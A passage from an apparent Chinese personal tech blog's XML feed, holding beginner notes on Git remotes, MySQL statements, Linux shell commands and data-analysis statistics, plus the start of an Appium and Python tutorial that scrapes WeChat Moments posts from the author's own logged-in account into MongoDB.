:refs/tags/v0.9：若已经把标签推送到远程再删除标签的话，先执行本地的删除标签，然后再进行这一步进行远程删除。</li></ul><ol start="9"><li><p><strong>连接多个远程库进行管理，需要先将本地.ssh文件夹保存的公钥传到远程平台上，使得可以通过ssh通信</strong></p><p><code>码云</code></p></li></ol><ul><li>git remote add gitee <a href="mailto:git@gitee.com" target="_blank" rel="noopener">git@gitee.com</a>:Caixpeng/dragon.git</li><li>git remote -v</li><li>git pull gitee master：将远程的库同步到本地，这时候可能会遇到了一个问题就是提示两个库创建历史不一样，这种情况选择忽略，解决方法是在命令后面添加参数 --allow-unrelated–histories，之后就是需要更改合并冲突等一些问题。</li><li>git push xxx master：将本地的分支推送到远程，xxx是制定远程库时起的名字</li></ul><h1 id="待续"><a class="markdownIt-Anchor" href="#待续"></a> 待续</h1><pre><code> 之后可以进行定制化Git，学习Git，从使用入手，之后遇到问题时候在进行补充。 定制化Git可以更改显示颜色，忽略不重要文件，设置别名alias等，设置别名可以在配置文件`.git/config`中进行批量修改。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL学习（一）</title>
      <link href="/archives/42250562.html"/>
      <url>/archives/42250562.html</url>
      
        <content type="html"><![CDATA[<h1 id="什么是sql"><a class="markdownIt-Anchor" href="#什么是sql"></a> 什么是SQL?</h1><p>SQL(Structed Query Language)是一种<code>访问</code>和<code>处理</code>数据库的标准的计算机语言。</p><ul><li>SQL 面向数据库执行查询</li><li>SQL 可从数据库取回数据</li><li>SQL 可在数据库中插入新的记录</li><li>SQL 可更新数据库中的数据</li><li>SQL 可从数据库删除记录</li><li>SQL 可创建新数据库</li><li>SQL 可在数据库中创建新表</li><li>SQL 可在数据库中创建存储过程</li><li>SQL 可在数据库中创建视图</li><li>SQL 可以设置表、存储过程和视图的权限</li></ul><h1 id="什么是mysql"><a class="markdownIt-Anchor" href="#什么是mysql"></a> 什么是MySQL?</h1><p>是一种关系型数据库。可以按照数据结构来组织、存储数据的仓库。是一个免费开源项目，功能强大。</p><h1 id="准备工作"><a class="markdownIt-Anchor" href="#准备工作"></a> 准备工作</h1><p>首先是怎么安装，在安装之后开始使用，这段时间使用Linux，所以在Linux里面开始搭建使用。</p><ol><li><p>虚拟机安装CentOS 7</p><ul><li>安装VMware</li><li>创建一个虚拟机，然后进行按步骤进行安装，在选项中要记得设置好root密码，选择最小安装就可以。</li></ul></li><li><p>安装MySQL</p></li></ol><h1 id="mysql的基本操作"><a class="markdownIt-Anchor" href="#mysql的基本操作"></a> MySQL的基本操作</h1><ol><li><p>创建数据库</p><ul><li>登录MySQL服务器后，使用<code>crate database &lt;name&gt;</code>；</li><li>使用mysqladmin， <code>mysqladmin u root -p create &lt;name&gt;</code>；</li></ul></li><li><p>删除数据库</p><ul><li>同1中，使用<code>drop database &lt;name&gt;</code>；</li><li>同1中，使用<code>mysqladmin -u root -p drop &lt;name&gt;</code>；</li></ul></li><li><p>选择数据库</p><ul><li><code>use &lt;name&gt;</code>；</li></ul></li><li><p>创建数据库表</p><p>创建数据表需要：</p><ul><li>表名</li><li>表字段名</li><li>定义每个表字段</li></ul><p>语法：注意MySQL命令终止符为<code>;</code></p><ul><li>CREATE TABLE &lt;TABLE_NAME&gt;()ENGINE=InnoDB DEFAULT CHARSET=utf8；</li></ul></li><li><p>删除数据表</p><ul><li>DROP TABLE &lt;TABLE_NAME&gt;；</li></ul></li><li><p>插入数据</p><ul><li>INSERT INTO TABLE_NAME(&lt;,&gt;VALUES&lt;,&gt;);    如果一条语句太长，可以通过enter键来创建新行编写</li></ul></li><li><p>查询数据</p><ul><li>SELECT column_name,column_name FROM TABLE_NAME [WHERE Clause] [LIMINT N][OFFSET M];</li></ul></li><li><p>WHERE子句</p><ul><li>… WHERE condition1 [AND][OR] condition2, …；</li><li>注意：<strong>子句中的字符串是不区分大小写的，要想区分开来需要添加WHERE BINARY关键字来限定</strong></li><li>可以使用操作符来判断。如<code>&gt;,&lt;,!=,&lt;=,&gt;=,</code></li></ul></li><li><p>使用UPDATE查询</p><ul><li>UPDATE TABLE_NAME SET field1=new-value1,…；</li><li>可以同时更新多个字符段，后面可添加WHERE子句</li></ul></li><li><p>使DELETE</p><ul><li>DELETE FROM TABLE_NAME [WHERE Clause]；</li><li>其中WHERE子句可以实现制定条件的删除，否则就是表中的全部数据都被删除</li></ul></li><li><p>LIKE子句</p><ul><li>SELECT field1,field2,… FROM TABLE_NAME WHERE … LIKE …；</li><li>可以在WHERE中使用LIKE子句，可以使用LIKE 代替=</li><li>使用%来代替任意字符，类似于正则表达式中的<code>*</code></li></ul></li><li><p>UNION操作符</p><blockquote><p>操作符用于连接SELECT语句的结果组合到一个结果集合中。多个SELECT语句会删除重复的数据。</p></blockquote><ul><li>SELECT expression1,expression2,… FROM TABLE_NAME [WHERE Clause] UNION [ALL|DISTINCT] SELECT …；</li><li>ALL代表返回所有结果集，包含重复数据</li></ul></li><li><p>排序ORDER BY子句</p><ul><li>SELECT field1, field2,…fieldN table_name1, table_name2… ORDER BY field1, [field2…] [ASC [DESC]]；</li><li>可以通过设置ASC DESC来设置升序还是降序</li></ul></li><li><p>分组</p><ul><li>SELECT column_name, function(column_name) FROM TABLE_NAME WHERE … GROUP BY column_name;</li><li>使用WITH ROOLUP可以实现分组统计数据基础上再进行相同的统计SELECT column_name, function(column_name) FROM TABLE_NAME WHERE … GROUP BY column_name WITH ROLLUP;</li><li>使用coalesce设置一个取代NULL 的名称coalesce(a,b,C)若a为NULL则使用b,以此类推，若全为空则设置为NULL</li></ul></li><li><p>数据表的连接</p><ul><li>INNER JOIN 内连接，获取两个表中相互匹配的字段</li><li>LEFT JOIN 左连接，获取左边表的全部数据，不管有没有匹配</li><li>RIGHT JOIN 右连接，类似上</li><li>SELECT a.runoob_id, a.runoob_author, b.runoob_count FROM runoob_tbl a INNER JOIN tcount_tbl b ON a.runoob_author=b.runoob_author;</li></ul></li><li><p>事务</p><blockquote><p>主要用于处理操作两大，复杂度高的数据，一系列的数据库操作语句构成了事务，在MySQL中只有使用了InnoDB引擎的数据库或者表才支持事务，事务处理是为了维护数据库的完整性，要不进行完成彻底，要不就不变动。</p></blockquote><p>事务满足四个条件（ACID）:</p><ul><li>原子性：要么完成，要么不完成</li><li>一致性：事务完成前后数据库的完整性不会打破</li><li>隔离性：允许并发事务的同时对数据进行操作</li><li>持久性：事务结束之后，对数据的修改是永久的</li></ul><p>事务的执行流程：</p><ul><li>BEGIN;</li><li>ROLLBAK;</li><li>COMMIT;</li><li>可以在提交之前任意点回滚到开始事务前，可以通过SET AUTOCOMMIT=0或1来设置是否自动提交</li></ul></li><li><p>ALTER变更</p><blockquote><p>当需要变更表中的字段或者修改表名时使用ALTER语句</p></blockquote><ul><li>ALTER TABLE TABLE_NAME DROP/ADD FIRST/AFTER I TYPE;</li><li>ALTER TABLE TABLE_NAME RENAME TO NEW_NANE;</li><li>变更存储引擎；删除外键别名；</li></ul></li><li><p>索引</p><blockquote><p>索引可以提高数据库的检索速度，但是学数据结构的时候我们知道数组随机存取很快但是更新的速度相对会慢，索引也一样。</p></blockquote><p>索引可以分为：</p><ul><li>单列索引：一个索引包含一个列。</li><li>组合索引：一个索引包含多个列。</li></ul></li></ol><blockquote><p>待补充</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux基础（一）</title>
      <link href="/archives/843f592a.html"/>
      <url>/archives/843f592a.html</url>
      
        <content type="html"><![CDATA[<h1 id="一-linux命令行"><a class="markdownIt-Anchor" href="#一-linux命令行"></a> 一、Linux命令行</h1><h2 id="1-什么是linux"><a class="markdownIt-Anchor" href="#1-什么是linux"></a> 1、什么是linux？</h2><p><code>Linux</code>可分为内核（内存、文件系统、软件、硬件）、GNU工具（运用操作系统的一套标准工具；shell）、图形化桌面环境（文本操作界面演变为图形化操作界面：X Window、KDE、Unity、GNOME）、应用软件.</p><p>Linux发行版（精简化定制类型的版本；专业版本，适合不同的办公应用环境）：Debian、Redhat、Centos、Ubuntu、Fedora、OpenSUSE等</p><h2 id="2-什么是shell"><a class="markdownIt-Anchor" href="#2-什么是shell"></a> 2、什么是shell？</h2><ul><li><p>Shell:用户与操作系统之间交互工具（壳）</p></li><li><p>发展：CLI（文本界面）–&gt;命令终端仿真器/控制台终端</p></li><li><p>一般在图形化桌面环境中只要从菜单栏就可以找到虚拟控制台终端的入口：Terminal</p></li></ul><h2 id="3-基本shell命令"><a class="markdownIt-Anchor" href="#3-基本shell命令"></a> 3、基本shell命令</h2><p>命令提示符$:辅助提示功能</p><ul><li>help/man 命令名称:查看命令使用手册</li><li>cd：遍历目录，.代表当前目录…代表当前目录的父目录</li><li>ls：文件目录显示 -F 区分文件和目录 -R递归显示目录 -la，同时还可以根据通配符进行有选择性的显示查看文件和目录信息</li><li>touch：创建文件</li><li>cp：复制文件，如果选择参数-i则会强制shell进行提示，-R都知道是递归的意思</li><li>ln 源文件 链接文件：创建链接文件 -s创建软连接，不加就是创建硬链接，注意区分软和硬的区别；所谓硬就是文件共享iNode编号，是一个文件。软链接只是指向了数据文件</li></ul><p><img src="1.png" alt="" /></p><ul><li>mv：重命名剪切</li><li>rm：删除文件</li><li>mkdir：创建目录</li><li>rmdir：删除目录，注意是删除空目录。</li><li>file：查看文件类型</li></ul><p><img src="2.png" alt="" /></p><ul><li>cat：查看整个文件 -n显示行号 -b只给文本显示行号 -T禁止显示制表符</li><li>more less tail head最为特殊的是head和tail分别是显示文件的前几行和后几行，可以通过参数-n number来控制显示的行数</li><li>ps：默认情况下只显示运行在当前控制台下的属于当前用户的进程。 -ef    --forest可以展示嵌套结构</li><li>top：实时监控进程</li><li>kill pid：杀死进程</li><li>killall pid或者进程名称同时支持通配符：结束进程 参数-9强制结束进程</li><li>为了检测系统磁盘的使用情况，需要运用命令来帮助管理存储媒体<br />mount -t type dev directory：挂载媒体到制定目录</li><li>umount：删除媒体设备卸载</li><li>df -h：显示每个有数据的已挂载的文件系统的磁盘使用情况</li><li>du -h：显示当前文件夹下的磁盘使用情况</li><li>sort：排序，用来处理文件数据的排序 -n识别数字 -M识别月 -t 指定分隔符 -k指定排序位置</li><li>grep：搜索查找数据；-v反向搜索， -n显示行号 可以使用正则表达式</li><li>gzip：压缩数据文件 .gz</li><li>zip: .zip</li><li>bzip2: .bz2</li><li>tar:文件归档，常用进行文件打包压缩备份，解压缩。</li></ul><p><img src="3.png" alt="" /></p><ul><li>jobs：显示后台左右用户的进程（作业）</li></ul><p><img src="4.png" alt="" /></p><ul><li>coproc：协程，会在后台生成一份shell，并在这个新的shell中运行命令。并且可以和进程列表进行联合使用（命令；）</li><li>&amp;：让命令到后台运行，就在命令后面添加$</li><li>which:</li><li>type:</li><li>pwd:</li><li>history：显示命令使用记录。命令使用记录被保存在隐藏文件.bash_history中，位于用户的主目录中。bash的命令是先写入内存中，在shell退出时才被写入文件中。</li><li>printenv：查看全局变量</li><li>echo：回显命令</li><li>set：显示某个进程内设置的所有的环境变量</li><li>Export：将变量变为全局变量</li><li>unset：删除变量</li></ul><h2 id="4-初识环境变量以及怎么样设置环境变量"><a class="markdownIt-Anchor" href="#4-初识环境变量以及怎么样设置环境变量"></a> 4、初识环境变量以及怎么样设置环境变量</h2><p>环境变量：</p><ul><li>局部环境变量</li><li>全局环境变量</li></ul><p>如何设置环境变量</p><p>命令的可执行文件所在目录路径必须在PATH变量中，添加方式：PATH=$PATH:路径;环境变量可以作为数组使用，能够设置多个值，（值1  值2  值3）</p><h2 id="5-文件管理及文件权限设置"><a class="markdownIt-Anchor" href="#5-文件管理及文件权限设置"></a> 5、文件管理及文件权限设置</h2><p>Linux将文件存储在单个目录结构中–虚拟目录，然后虚拟目录将安装在PC上所有的存储设备的文件路径纳入到单个目录结构中。虚拟目录结构只包含一个称为根目录的基础目录</p><p><img src="5.png" alt="" /></p><ul><li>/bin:存放用户级的GNU工具</li><li>/boot</li><li>/dev：设备目录，创建设备节点</li><li>/etc：系统配置文件目录</li><li>/root：root用户的主目录</li><li>/usr：大量用户级的GNU工具和数据文件都存储在这里</li><li>/home：用户的家目录，linux在这里创建用户</li><li>/var：用于存放经常变化的文件，比如日志文件。</li><li>/lib：库目录，存放系统和应用程序的库文件</li><li>/lib4</li><li>/media：媒体文件，挂载可移动媒体设备的常用挂载点</li><li>/mnt：另一个可移动媒体设备的常用挂载点</li><li>/proc：进程目录，存放现有硬件以及当前进程的相关信息</li><li>/sbin：管理级别的GNU工具</li><li>/tmp</li><li>/sys</li><li>/srv:服务目录存放本地服务的相关文件</li><li>/etc/passwd文件存储用户信息 /etc/shadow存储用户的登录密码</li></ul><p><img src="6.png" alt="" /><br /><img src="7.png" alt="" /></p><p>用户添加、修改、删除</p><ul><li>useradd、userdel、usermod（-l修改用户登录的用户名，-L锁定 -U解除锁定 -p修改账户密码）</li><li>passwd：修改已有用户密码</li><li>chpasswd从文件中读取用户密码并更新， 大量修改用户密码时可以读取用户和密码对的文件chpasswd &lt; wenjian</li><li>chsh：更改用户账户默认登录shell</li><li>/etc/group文件</li><li>创建、修改、删除用户组</li><li>groupadd、groupmod、groupdel</li><li>更改权限chmod（ugoa）chown（更改属主）、chgrp（更改属组）</li></ul><h2 id="6-安装卸载更新程序的步骤"><a class="markdownIt-Anchor" href="#6-安装卸载更新程序的步骤"></a> 6、安装卸载更新程序的步骤</h2><p>了解包管理系统（PMS）：</p><ul><li>Debian下的是dpkg命令 前端工具：apt-get apt-cache aptitude；</li><li>Redhat下的是rpm命令 前端工具：yum、urpm、zpper。</li></ul><p><strong>我们知道一些包的安装是需要一些依赖包的，在安装这类包之前，它的依赖包应该提前安装在本地。</strong></p><p>aptitude安装软件包：</p><ul><li>aptitude search package_name找到特定的包， i已安装 p v可用未安装</li><li>aptitude install package_name</li><li>aptitude safe_upgrade全部更新</li><li>aptitude purge package_name卸载包</li></ul><p>yum安装包命令：</p><ul><li>yum list installed，列出已安装软件包</li><li>yum provides package_name可以看包归属</li><li>yum install package_name：安装包</li><li>本地安装localinstall *.rpm</li><li>yum update</li><li>yum remove package_name：删除软件包保留配置文件和数据文件</li><li>yum erase package_name：删除软件包和所有文件。</li></ul><p>其他步骤：</p><ol><li>下载安装包 a.gz</li><li>解压安装包 tar -zvxf a.gz</li><li>进入解压目录 cd b</li><li>进行安装 ./configure</li><li>进行编译 make make install</li></ol><h2 id="7-常见编辑器及其操作命令"><a class="markdownIt-Anchor" href="#7-常见编辑器及其操作命令"></a> 7、常见编辑器及其操作命令</h2><p>常见编辑器：vim、nano、emacs、KWrite、Kate、GNOME编辑器</p><p>检查别名alias name</p><p>VIM：<br />插入模式模式、命令模式、末行模式<br />移动：</p><ul><li>k↑</li><li>j↓</li><li>h←</li><li>l→</li></ul><p>复制、删除、剪切、粘贴：</p><ul><li>yw复制单词 y$复制到行尾dd删除 p粘贴 .重复上一操作</li><li>G移动到行首</li><li>gg光标移动到首行</li><li>wq保存退出</li><li>q！取消修改退出</li><li>zz保存退出</li></ul><h2 id="8-网络配置方法"><a class="markdownIt-Anchor" href="#8-网络配置方法"></a> 8、网络配置方法</h2><p><a href="https://blog.csdn.net/rzc666/article/details/50491305" target="_blank" rel="noopener" title="【参考】网络配置方法">https://blog.csdn.net/rzc666/article/details/50491305</a></p><h1 id="二-shell脚本编程基础"><a class="markdownIt-Anchor" href="#二-shell脚本编程基础"></a> 二、Shell脚本编程基础</h1><p>1、构建基本脚本</p><p>2、使用结构化命令</p><p>3、处理用户输入</p><p>4、呈现数据</p><p>5、控制脚本</p><h1 id="三-高级shell脚本编程"><a class="markdownIt-Anchor" href="#三-高级shell脚本编程"></a> 三、 高级shell脚本编程</h1><p>1、创建函数</p><p>2、图形化界面进行脚本编程</p><p>3、正则表达式</p><p>4、Sed、awk</p><h1 id="四-脚本实例"><a class="markdownIt-Anchor" href="#四-脚本实例"></a> 四、 脚本实例</h1><p>1、简单脚本工具</p><p>2、创建与数据库和web以及电子邮件有关的脚本</p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据分析与挖掘（一）</title>
      <link href="/archives/9c2ffa7.html"/>
      <url>/archives/9c2ffa7.html</url>
      
        <content type="html"><![CDATA[<h1 id="q1-数据仓库data-warehouse-dw和数据库的区别"><a class="markdownIt-Anchor" href="#q1-数据仓库data-warehouse-dw和数据库的区别"></a> Q1、数据仓库（Data Warehouse, DW）和数据库的区别</h1><blockquote><p>数据仓库是一个很大的数据存储集合，出于企业的分析性报告和决策支持目的而创建。对于多种的业务数据进行筛选和整合，为企业提供一定的BI能力，知道业务流程改进、监视时间、成本、质量、控制。</p></blockquote><ul><li>数据仓库的输入方是各种各样的数据源，最终的输出用于企业的数据分析、数据挖掘、数据报表等方向。</li><li>数据仓库可以对数据库存储的同一主题的数据进行整合处理</li><li>不同源的数据整合依靠的是ETL,指的是Extract-Transform-Load过程，描述的是将数据从来源迁移到目标的过程（数据抽取-数据转换-数据加载）</li></ul><p>数据仓库：Hive、Teradata、Oracle、Db2等</p><h1 id="q2-数据分析怎么获取数据"><a class="markdownIt-Anchor" href="#q2-数据分析怎么获取数据"></a> Q2、数据分析：怎么获取数据？</h1><ul><li>从数据仓库中获取</li><li>数据监测，如传感器等的数据来源</li><li>利用爬虫获取 urllib、urllib2、request、scrapy等各种抓取包，爬虫涉及分布式爬虫、反爬虫技术等。</li><li>填写、埋点、日志。埋点记录用户与互联网交互过程；日志记录的信息更加精简，同时方便定位问题。一般以文件存储。包括前端日志、后端日志，前端日志需要加载到后端查看。</li><li>分析已有数据来进行计算，获得具有实际意义的数据。</li></ul><h1 id="q3-学习资源"><a class="markdownIt-Anchor" href="#q3-学习资源"></a> Q3、学习资源</h1><ul><li>数据学习网站kaggle、天池、</li><li>数据网站：ImageNet/Open Images、</li><li>统计数据（统计局、公司财报、政府机构等）</li></ul><h1 id="q4-怎么进行数据探索"><a class="markdownIt-Anchor" href="#q4-怎么进行数据探索"></a> Q4、怎么进行数据探索</h1><p><strong>拿到一个数据集，应该首先了解相关文档，熟悉文件中的统计名称。</strong></p><p>对于数据集中的人数据我们可以先研究数据的分布趋势：<code>集中趋势、离中趋势</code></p><ol><li><p>集中趋势：</p><ul><li>均值</li><li>中位数</li><li>分位数: <code>(n+1)*[0.25,0.5,0.75]</code>求解时要根据数据个数的奇偶分为求算</li><li>众数</li></ul></li><li><p>离中趋势：</p><ul><li>标准差 std()</li><li>方差 var()</li><li>1倍std（69%） 1.96倍std（95%）2.58倍std（99%）</li></ul></li><li><p>数据分布：</p><ul><li>偏态系数：正偏、负偏</li><li>峰态系数（对集中强度的衡量，数值越大峰值越尖）：正态分布的数据峰态系数一般是3，一般相差大于2（&lt;1,&gt;5）的话，那么就可以认为不是正态分布了。</li></ul></li><li><p>常用分布为：</p><ul><li>正态分布（标准正态分布）</li><li>t分布</li><li>F分布</li><li>卡方分布</li></ul></li><li><p>抽样:一是全量计算的成本比较大、二是不要进行全量计算就可以满足需求</p><ul><li>分层抽样</li><li>等距抽样</li><li>…</li></ul></li><li><p>数据分类：</p><ul><li>定类：类别间没有差距的，</li><li>定序分类：数据间有了差距</li><li>定距分类：没有绝对零点。不能进行相应计算，如温度</li><li>定比分类：可以界定数据大小，如常用的度量数据等</li></ul></li><li><p>单属性分析</p><ul><li>异常值分析（连续使用分位数来求、离散、知识异常值）</li><li>对比分析（绝对数比较（数字直接进行比较）、相对数比较（结构部分和整体、比例（整体内的不同比例比较）、（比较，同质进行比较）、动态、强度（密度、人均等））怎么比较时间下进行比较（同比、环比）、空间（城市、部门、公司）、经验与计划（实施进度和排期的比较）</li><li>结构分析（部分与总体）（静态、动态）</li><li>分布分析：直接概率分布、判断是不是正态分布</li><li>极大似然</li></ul></li><li><p>相关API</p><ul><li>max()</li><li>min()</li><li>median()中位数</li><li>var()方差</li><li>std()标准差</li><li>skew()偏态系数</li><li>kurt()峰态系数</li><li>quantitle()分位数</li><li>fillna()</li><li>dropna(axis=0，how=‘any’)</li><li>value_counts()可以添加bins左开有闭(]</li><li>value_counts(normalize=True)按照比例进行分析</li><li>sort_index()</li><li>直方图histogram(value, bins=10);分成几份</li><li>histogram(value, bins=np.arrange(0,1,0.1))  左闭右开[)</li><li>groupby()分组  可以根据根据需要选择聚合方式。</li><li>apply()</li><li>loc()切片</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> 数据分析 </tag>
            
            <tag> 数据挖掘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用Appium+Python爬取朋友圈实习信息</title>
      <link href="/archives/45d22ee3.html"/>
      <url>/archives/45d22ee3.html</url>
      
        <content type="html"><![CDATA[<h1 id="前期准备工作"><a class="markdownIt-Anchor" href="#前期准备工作"></a> 前期准备工作</h1><ul><li>安装MongoDB  NoSQL 建议最后安装可视化环境，不然会面临卡在安装界面很长时间。</li><li>安装pymongo模块，pip3安装</li><li>安装Android开发环境，下载Android Studio，并安装相应的安卓SDK版本</li><li>安装JDK,需要使用java命令</li><li>安装Appium，从Github中下载；另外还需要安装模块appium，后边python程序需要做接口，安装具体方法：<code>pip install Appium_Python_Client</code></li><li>使用过程中要电脑连接手机，打开手机调试开关。</li></ul><h1 id="一-关于appium"><a class="markdownIt-Anchor" href="#一-关于appium"></a> 一、关于Appium</h1><blockquote><p>Appium是一种移动端的自动化测试工具，和PC端使用的Selenium类似，该工具可以驱动Android、iOS等设备完成自动化测试。</p></blockquote><p>首先打开appium软件启动服务，相当于打开了一个Appium服务器，使用端口名称为：<code>4723</code></p><p>然后<code>Start Inspecter Session</code><br />在进行如下配置：<br />需要在用adb devices -l 获取你的手机设备名字(<code>model字段的内容</code>)</p><p><img src="q.jpg" alt="" /></p><p>配置好之后点击<code>Start Session</code><br />进入微信登录界面如下，左边的窗口会实时显示手机屏幕信息，中间块显示每个块的信息，右边部分显示一些属性如<code>xpath和id</code>等。这个窗口是为了在后边编写代码时获取相应XPATH和ID的。</p><p><img src="1.png" alt="" /></p><p>按照爬取流程可能用到的依次是登录、密码、下一步、发现、朋友圈、每条朋友圈的昵称、内容和分享的文章名。<br />对了会出现提示你是否打开手机通讯录，需要在Appium中实际操作下，记录否的按钮对应的元素ID。</p><h1 id="二-爬取朋友圈信息代码"><a class="markdownIt-Anchor" href="#二-爬取朋友圈信息代码"></a> 二、爬取朋友圈信息代码</h1><p>具体ID每个手机设备都不一样，需要自己在Appium中获取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium <span class="keyword">import</span> webdriver</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> appium.webdriver.common.touch_action <span class="keyword">import</span> TouchAction</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> NoSuchElementException</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by <span class="keyword">import</span> By</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pymongo <span class="keyword">import</span> MongoClient</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># 平台</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">PLATFORM = <span class="string">'Android'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># 手机设备名称</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">DEVICE_NAME = <span class="string">'TA_1054'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># APP包名</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">APP_PACKAGE = <span class="string">'com.tencent.mm'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># 入口类名</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">APP_ACTIVITY = <span class="string">'.ui.LauncherUI'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># Appium地址</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">DRIVER_SERVER = <span class="string">'http://localhost:4723/wd/hub'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># 超时时间设置</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">TIMEOUT = <span class="number">500</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># 微信手机号密码</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">USERNAME = <span class="string">'NUMBER'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">PASSWORD = <span class="string">'PASSWD'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># 滑动位置和距离</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line">FLICK_START_X = <span class="number">300</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line">FLICK_START_Y = <span class="number">300</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">FLICK_DISTANCE = <span class="number">700</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># MongoDB配置</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line">MONGO_URL = <span class="string">'localhost'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line">MONGO_DB = <span class="string">'moments'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line">MONGO_COLLECTION = <span class="string">'moments'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line"><span class="comment"># 滑动间隔</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line">SCROLL_SLEEP_TIME = <span class="number">2</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moments</span><span class="params">()</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">        <span class="string">"""</span></span></pre></td></tr><tr><td class="gutter"><pre><span 